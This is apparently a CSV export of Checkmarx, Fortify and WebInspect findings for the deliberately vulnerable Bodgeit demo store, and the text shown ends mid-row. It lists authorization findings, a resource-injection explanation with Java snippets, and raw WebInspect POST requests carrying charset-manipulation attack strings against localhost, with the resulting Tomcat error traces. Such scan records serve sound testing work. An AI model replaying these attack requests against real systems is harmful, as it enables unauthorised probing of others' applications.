"DemoApps","","Bodgeit","536","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","541","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","545","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","553","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","557","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","657","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","660","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","398","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/contact.jsp","","","http://localhost/bodgeit/root/contact.jsp","","","","","","","",""
"DemoApps","","Bodgeit","493","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/contact.jsp","","","http://localhost/bodgeit/root/contact.jsp","","","","","","","",""
"DemoApps","","Bodgeit","638","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/contact.jsp","","","http://localhost/bodgeit/root/contact.jsp","","","","","","","",""
"DemoApps","","Bodgeit","290","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/header.jsp","","","http://localhost/bodgeit/root/header.jsp","","","","","","","",""
"DemoApps","","Bodgeit","297","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/header.jsp","","","http://localhost/bodgeit/root/header.jsp","","","","","","","",""
"DemoApps","","Bodgeit","359","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/home.jsp","","","http://localhost/bodgeit/root/home.jsp","","","","","","","",""
"DemoApps","","Bodgeit","400","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/home.jsp","","","http://localhost/bodgeit/root/home.jsp","","","","","","","",""
"DemoApps","","Bodgeit","285","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/init.jsp","","","http://localhost/bodgeit/root/init.jsp","","","","","","","",""
"DemoApps","","Bodgeit","291","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","317","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","419","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","591","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","601","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","622","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","628","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","633","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","463","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/password.jsp","","","http://localhost/bodgeit/root/password.jsp","","","","","","","",""
"DemoApps","","Bodgeit","620","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/password.jsp","password1","","http://localhost/bodgeit/root/password.jsp","","","","","","","",""
"DemoApps","","Bodgeit","328","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/product.jsp","","","http://localhost/bodgeit/root/product.jsp","","","","","","","",""
"DemoApps","","Bodgeit","501","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/product.jsp","","","http://localhost/bodgeit/root/product.jsp","","","","","","","",""
"DemoApps","","Bodgeit","613","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/product.jsp","","","http://localhost/bodgeit/root/product.jsp","","","","","","","",""
"DemoApps","","Bodgeit","305","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","411","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","473","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","515","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","563","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","582","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","626","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","661","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","405","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/score.jsp","","","http://localhost/bodgeit/root/score.jsp","","","","","","","",""
"DemoApps","","Bodgeit","274","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/search.jsp","","","http://localhost/bodgeit/root/search.jsp","","","","","","","",""
"DemoApps","","Bodgeit","295","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/search.jsp","","","http://localhost/bodgeit/root/search.jsp","","","","","","","",""
"DemoApps","","Bodgeit","643","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/root/search.jsp","","","http://localhost/bodgeit/root/search.jsp","","","","","","","",""
"DemoApps","","Bodgeit","296","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","http://localhost/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","","","","","",""
"DemoApps","","Bodgeit","303","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","http://localhost/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","","","","","",""
"DemoApps","","Bodgeit","324","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","http://localhost/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","","","","","",""
"DemoApps","","Bodgeit","570","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","http://localhost/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","","","","","",""
"DemoApps","","Bodgeit","656","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/src/com/thebodgeitstore/selenium/tests/FunctionalTest.java","","","http://localhost/bodgeit/src/com/thebodgeitstore/selenium/tests/FunctionalTest.java","","","","","","","",""
"DemoApps","","Bodgeit","286","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/src/com/thebodgeitstore/selenium/tests/FunctionalZAP.java","","","http://localhost/bodgeit/src/com/thebodgeitstore/selenium/tests/FunctionalZAP.java","","","","","","","",""
"DemoApps","","Bodgeit","624","Improper_Resource_Access_Authorization","","Low","Open","2015-10-15","Checkmarx","285","Improper Authorization","A7","/bodgeit/src/com/thebodgeitstore/selenium/tests/FunctionalZAP.java","","","http://localhost/bodgeit/src/com/thebodgeitstore/selenium/tests/FunctionalZAP.java","","","","","","","",""
"DemoApps","","Bodgeit","250","Resource Injection","","Low","Open","2015-10-15","Fortify SCA","99","Improper Control of Resource Identifiers ('Resource Injection')","A4","root/basket.jsp","referer","","http://localhost/root/basket.jsp","","","","Abstract: <Content><Paragraph>Attackers can control the resource identifier argument to <Replace key=""PrimaryCall.name""/> at <Replace key=""PrimaryLocation.file""/> line <Replace key=""PrimaryLocation.line""/>, which could enable them to access or modify otherwise protected system resources.<AltParagraph>Allowing user input to control resource identifiers could enable an attacker to access or modify otherwise protected system resources.</AltParagraph></Paragraph></Content> Explanation: <Content>A resource injection issue occurs when the following two conditions are met: 1. An attacker can specify the identifier used to access a system resource. For example, an attacker may be able to specify a port number to be used to connect to a network resource. 2. By specifying the resource, the attacker gains a capability that would not otherwise be permitted. For example, the program may give the attacker the ability to transmit sensitive information to a third-party server. <Paragraph> In this case, the attacker can specify the value that enters the program at <Replace key=""SourceFunction"" link=""SourceLocation""/> in <Replace key=""SourceLocation.file""/> at line <Replace key=""SourceLocation.line""/>, and this value is used to access a system resource at <Replace key=""SinkFunction"" link=""SinkLocation""/> in <Replace key=""SinkLocation.file""/> at line <Replace key=""SinkLocation.line""/>. </Paragraph> Note: Resource injection that involves resources stored on the filesystem goes by the name path manipulation and is reported in separate category. See the path manipulation description for further details of this vulnerability. <b>Example 1:</b> The following code uses a port number read from an HTTP request to create a socket. <pre> String remotePort = request.getParameter(""remotePort""); ... ServerSocket srvr = new ServerSocket(remotePort); Socket skt = srvr.accept(); ... </pre> Some think that in the mobile world, classic web application vulnerabilities, such as resource injection, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication. <b>Example 2:</b> The following code uses a URL read from an Android intent to load the page in <code>WebView</code>. <pre> ... WebView webview = new WebView(this); setContentView(webview); String url = this.getIntent().getExtras().getString(""url""); webview.loadUrl(url); ... </pre> The kind of resource affected by user input indicates the kind of content that may be dangerous. For example, data containing special characters like period, slash, and backslash are risky when used in methods that interact with the file system. Similarly, data that contains URLs and URIs is risky for functions that create remote connections.</Content>","Recommendations: <Content>The best way to prevent resource injection is with a level of indirection: create a list of legitimate resource names that a user is allowed to specify, and only allow the user to select from the list. With this approach the input provided by the user is never used directly to specify the resource name. In some situations this approach is impractical because the set of legitimate resource names is too large or too hard to keep track of. Programmers often resort to blacklisting in these situations. Blacklisting selectively rejects or escapes potentially dangerous characters before using the input. However, any such list of unsafe characters is likely to be incomplete and will almost certainly become out of date. A better approach is to create a whitelist of characters that are allowed to appear in the resource name and accept input composed exclusively of characters in the approved set.</Content> Tips: 1.If the program is performing input validation, satisfy yourself that the validation is correct, and use the HPE Security Fortify Custom Rules Editor to create a cleanse rule for the validation routine. 2.Since implementing a blacklist that is effective on its own is notoriously difficult, if validation logic relies on blacklisting, one should be skeptical. Consider different types of input encoding and different sets of meta-characters that might have special meaning when interpreted by different operating systems, databases, or other resources. Determine whether or not the blacklist can be updated easily, correctly, and completely if these requirements ever change. 3.A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the HPE Security Fortify Secure Coding Rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.","","",""
"DemoApps","","Bodgeit","25","Setting Manipulation: Character Set","","Low","Open","2015-10-15","WebInspect","116","Improper Encoding or Escaping of Output","","/bodgeit/basket.jsp","quantity","","http://localhost:8080/bodgeit/basket.jsp","POST /bodgeit/basket.jsp HTTP/1.1 Referer: http://localhost:8080/bodgeit/product.jsp?prodid=7 Content-Type: application/x-www-form-urlencoded Content-Length: 53 Accept: */* Pragma: no-cache Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0 Host: localhost:8080 Connection: Keep-Alive X-WIPP: AscVersion=10.50.327.10 X-Scan-Memo: Category=""Audit.Attack""; SID=""6393F1736B5AD56887830421780C6493""; PSID=""F2239B8A3CEC359684886107925BCABC""; SessionType=""AuditAttack""; CrawlType=""None""; AttackType=""PostParamManipulation""; OriginatingEngineID=""29fad754-9640-4489-b6cf-91c822ecbd39""; AttackSequence=""0""; AttackParamDesc=""quantity""; AttackParamIndex=""2""; AttackParamSubIndex=""0""; CheckId=""11252""; Engine=""User+Controlled+Charset""; SmartMode=""NonServerSpecificOnly""; AttackString=""1%253b%2520charset%253dutf-8""; AttackStringProps=""Attack""; ThreadId=""35""; ThreadType=""AuditorStateRequestorPool""; X-RequestManager-Memo: sid=""55""; smi=""0""; sc=""1""; ID=""f035188f-1400-4a7a-8d6b-de49ae562e1c""; X-Request-Memo: ID=""7f0d0fb2-1ad3-4bc9-bcef-fd8cd202d060""; sc=""1""; ThreadId=""69""; Cookie: CustomCookie=WebInspect111919ZX5DC03815A4AB4C25AA4C639CA9ED0231YDB2C;JSESSIONID=37347B65FE07002A330BD1BEC7305050;b_id=7 productid=7&price=3.5&quantity=1%3b%20charset%3dutf-8","POST /bodgeit/basket.jsp HTTP/1.1 Referer: http://localhost:8080/bodgeit/product.jsp?prodid=7 Content-Type: application/x-www-form-urlencoded Content-Length: 53 Accept: */* Pragma: no-cache Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0 Host: localhost:8080 Connection: Keep-Alive X-WIPP: AscVersion=10.50.327.10 X-Scan-Memo: Category=""Audit.Attack""; SID=""6393F1736B5AD56887830421780C6493""; PSID=""F2239B8A3CEC359684886107925BCABC""; SessionType=""AuditAttack""; CrawlType=""None""; AttackType=""PostParamManipulation""; OriginatingEngineID=""29fad754-9640-4489-b6cf-91c822ecbd39""; AttackSequence=""0""; AttackParamDesc=""quantity""; AttackParamIndex=""2""; AttackParamSubIndex=""0""; CheckId=""11252""; Engine=""User+Controlled+Charset""; SmartMode=""NonServerSpecificOnly""; AttackString=""1%253b%2520charset%253dutf-8""; AttackStringProps=""Attack""; ThreadId=""35""; ThreadType=""AuditorStateRequestorPool""; X-RequestManager-Memo: sid=""55""; smi=""0""; sc=""1""; ID=""f035188f-1400-4a7a-8d6b-de49ae562e1c""; X-Request-Memo: ID=""7f0d0fb2-1ad3-4bc9-bcef-fd8cd202d060""; sc=""1""; ThreadId=""69""; Cookie: CustomCookie=WebInspect111919ZX5DC03815A4AB4C25AA4C639CA9ED0231YDB2C;JSESSIONID=37347B65FE07002A330BD1BEC7305050;b_id=7 productid=7&price=3.5&quantity=1%3b%20charset%3dutf-8","HTTP/1.1 500 Internal Server Error Server: Apache-Coyote/1.1 Content-Type: text/html;charset=utf-8 Content-Language: en Content-Length: 2716 Date: Thu, 15 Oct 2015 19:13:43 GMT Connection: close <html><head><title>Apache Tomcat/7.0.68 - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 500 - java.lang.NumberFormatException: For input string: &quot;1; charset=utf-81111&quot;</h1><HR size=""1"" noshade=""noshade""><p><b>type</b> Exception report</p><p><b>message</b> <u>java.lang.NumberFormatException: For input string: &quot;1; charset=utf-81111&quot;</u></p><p><b>description</b> <u>The server encountered an internal error that prevented it from fulfilling this request.</u></p><p><b>exception</b> <pre>org.apache.jasper.JasperException: java.lang.NumberFormatException: For input string: &quot;1; charset=utf-81111&quot; org.apache.jasper.servlet.JspServletWrapper.handleJspException(JspServletWrapper.java:556) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:477) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>root cause</b> <pre>java.lang.NumberFormatException: For input string: &quot;1; charset=utf-81111&quot; java.lang.NumberFormatException.forInputString(NumberFormatException.java:65) java.lang.Integer.parseInt(Integer.java:580) java.lang.Integer.parseInt(Integer.java:615) org.apache.jsp.basket_jsp._jspService(basket_jsp.java:277) org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:439) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>note</b> <u>The full stack trace of the root cause is available in the Apache Tomcat/7.0.68 logs.</u></p><HR size=""1"" noshade=""noshade""><h3>Apache Tomcat/7.0.68</h3></body></html>","","","","",""
"DemoApps","","Bodgeit","41","Setting Manipulation: Character Set","","Low","Open","2015-10-15","WebInspect","116","Improper Encoding or Escaping of Output","","/bodgeit/basket.jsp","quantity_12","","http://localhost:8080/bodgeit/basket.jsp","POST /bodgeit/basket.jsp HTTP/1.1 Referer: http://localhost:8080/bodgeit/basket.jsp Content-Type: application/x-www-form-urlencoded Content-Length: 115 Accept: */* Pragma: no-cache Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0 Host: localhost:8080 Connection: Keep-Alive X-WIPP: AscVersion=10.50.327.10 X-Scan-Memo: Category=""Audit.Attack""; SID=""4B185B52C1411A75B12470F28E7BA601""; PSID=""AEB77DB9767A0403D3B9B98F348DFFAA""; SessionType=""AuditAttack""; CrawlType=""None""; AttackType=""PostParamManipulation""; OriginatingEngineID=""29fad754-9640-4489-b6cf-91c822ecbd39""; AttackSequence=""0""; AttackParamDesc=""quantity_12""; AttackParamIndex=""4""; AttackParamSubIndex=""0""; CheckId=""11252""; Engine=""User+Controlled+Charset""; SmartMode=""NonServerSpecificOnly""; AttackString=""1%253b%2520charset%253dutf-8""; AttackStringProps=""Attack""; ThreadId=""33""; ThreadType=""AuditorStateRequestorPool""; X-RequestManager-Memo: sid=""53""; smi=""0""; sc=""1""; ID=""703e7aef-2e60-4595-8514-01855dbe4bf5""; X-Request-Memo: ID=""36b1f16d-993e-478c-b149-3cdfe3a156d4""; sc=""1""; ThreadId=""68""; Cookie: CustomCookie=WebInspect111919ZX5DC03815A4AB4C25AA4C639CA9ED0231YDB2C;JSESSIONID=A92787F126D728E17AB078AA8A9CA54C;b_id=8 quantity_7=1&quantity_26=211&quantity_18=11&quantity_20=1&quantity_12=1%3b%20charset%3dutf-8&update=Update%20Basket","POST /bodgeit/basket.jsp HTTP/1.1 Referer: http://localhost:8080/bodgeit/basket.jsp Content-Type: application/x-www-form-urlencoded Content-Length: 115 Accept: */* Pragma: no-cache Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0 Host: localhost:8080 Connection: Keep-Alive X-WIPP: AscVersion=10.50.327.10 X-Scan-Memo: Category=""Audit.Attack""; SID=""4B185B52C1411A75B12470F28E7BA601""; PSID=""AEB77DB9767A0403D3B9B98F348DFFAA""; SessionType=""AuditAttack""; CrawlType=""None""; AttackType=""PostParamManipulation""; OriginatingEngineID=""29fad754-9640-4489-b6cf-91c822ecbd39""; AttackSequence=""0""; AttackParamDesc=""quantity_12""; AttackParamIndex=""4""; AttackParamSubIndex=""0""; CheckId=""11252""; Engine=""User+Controlled+Charset""; SmartMode=""NonServerSpecificOnly""; AttackString=""1%253b%2520charset%253dutf-8""; AttackStringProps=""Attack""; ThreadId=""33""; ThreadType=""AuditorStateRequestorPool""; X-RequestManager-Memo: sid=""53""; smi=""0""; sc=""1""; ID=""703e7aef-2e60-4595-8514-01855dbe4bf5""; X-Request-Memo: ID=""36b1f16d-993e-478c-b149-3cdfe3a156d4""; sc=""1""; ThreadId=""68""; Cookie: CustomCookie=WebInspect111919ZX5DC03815A4AB4C25AA4C639CA9ED0231YDB2C;JSESSIONID=A92787F126D728E17AB078AA8A9CA54C;b_id=8 quantity_7=1&quantity_26=211&quantity_18=11&quantity_20=1&quantity_12=1%3b%20charset%3dutf-8&update=Update%20Basket","HTTP/1.1 500 Internal Server Error Server: Apache-Coyote/1.1 Content-Type: text/html;charset=utf-8 Content-Language: en Content-Length: 2700 Date: Thu, 15 Oct 2015 19:14:47 GMT Connection: close <html><head><title>Apache Tomcat/7.0.68 - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 500 - java.lang.NumberFormatException: For input string: &quot;1; charset=utf-8&quot;</h1><HR size=""1"" noshade=""noshade""><p><b>type</b> Exception report</p><p><b>message</b> <u>java.lang.NumberFormatException: For input string: &quot;1; charset=utf-8&quot;</u></p><p><b>description</b> <u>The server encountered an internal error that prevented it from fulfilling this request.</u></p><p><b>exception</b> <pre>org.apache.jasper.JasperException: java.lang.NumberFormatException: For input string: &quot;1; charset=utf-8&quot; org.apache.jasper.servlet.JspServletWrapper.handleJspException(JspServletWrapper.java:556) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:477) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>root cause</b> <pre>java.lang.NumberFormatException: For input string: &quot;1; charset=utf-8&quot; java.lang.NumberFormatException.forInputString(NumberFormatException.java:65) java.lang.Integer.parseInt(Integer.java:580) java.lang.Integer.parseInt(Integer.java:615) org.apache.jsp.basket_jsp._jspService(basket_jsp.java:332) org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:439) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>note</b> <u>The full stack trace of the root cause is available in the Apache Tomcat/7.0.68 logs.</u></p><HR size=""1"" noshade=""noshade""><h3>Apache Tomcat/7.0.68</h3></body></html>","","","","",""
"DemoApps","","Bodgeit","23","Setting Manipulation: Character Set","","Low","Open","2015-10-15","WebInspect","116","Improper Encoding or Escaping of Output","","/bodgeit/basket.jsp","quantity_18","","http://localhost:8080/bodgeit/basket.jsp","POST /bodgeit/basket.jsp HTTP/1.1 Referer: http://localhost:8080/bodgeit/basket.jsp Content-Type: application/x-www-form-urlencoded Content-Length: 88 Accept: */* Pragma: no-cache Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0 Host: localhost:8080 Connection: Keep-Alive X-WIPP: AscVersion=10.50.327.10 X-Scan-Memo: Category=""Audit.Attack""; SID=""831FC5462B0BC722D7D193A15ECDBFBB""; PSID=""7FD4B7EF6E1659D85B8F4BD4DF413821""; SessionType=""AuditAttack""; CrawlType=""None""; AttackType=""PostParamManipulation""; OriginatingEngineID=""29fad754-9640-4489-b6cf-91c822ecbd39""; AttackSequence=""0""; AttackParamDesc=""quantity_18""; AttackParamIndex=""2""; AttackParamSubIndex=""0""; CheckId=""11252""; Engine=""User+Controlled+Charset""; SmartMode=""NonServerSpecificOnly""; AttackString=""1%253b%2520charset%253dutf-8""; AttackStringProps=""Attack""; ThreadId=""36""; ThreadType=""AuditorStateRequestorPool""; X-RequestManager-Memo: sid=""49""; smi=""0""; sc=""1""; ID=""3ab4771d-e2bf-4dfe-b097-d78b3d0f3356""; X-Request-Memo: ID=""863d473f-8c02-4bf9-bc9b-c49f9f37917b""; sc=""1""; ThreadId=""66""; Cookie: CustomCookie=WebInspect111919ZX5DC03815A4AB4C25AA4C639CA9ED0231YDB2C;JSESSIONID=95425C707A42EAA4BE0BC4F23058CD56;b_id=9 quantity_7=211&quantity_26=211&quantity_18=1%3b%20charset%3dutf-8&update=Update%20Basket","POST /bodgeit/basket.jsp HTTP/1.1 Referer: http://localhost:8080/bodgeit/basket.jsp Content-Type: application/x-www-form-urlencoded Content-Length: 88 Accept: */* Pragma: no-cache Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0 Host: localhost:8080 Connection: Keep-Alive X-WIPP: AscVersion=10.50.327.10 X-Scan-Memo: Category=""Audit.Attack""; SID=""831FC5462B0BC722D7D193A15ECDBFBB""; PSID=""7FD4B7EF6E1659D85B8F4BD4DF413821""; SessionType=""AuditAttack""; CrawlType=""None""; AttackType=""PostParamManipulation""; OriginatingEngineID=""29fad754-9640-4489-b6cf-91c822ecbd39""; AttackSequence=""0""; AttackParamDesc=""quantity_18""; AttackParamIndex=""2""; AttackParamSubIndex=""0""; CheckId=""11252""; Engine=""User+Controlled+Charset""; SmartMode=""NonServerSpecificOnly""; AttackString=""1%253b%2520charset%253dutf-8""; AttackStringProps=""Attack""; ThreadId=""36""; 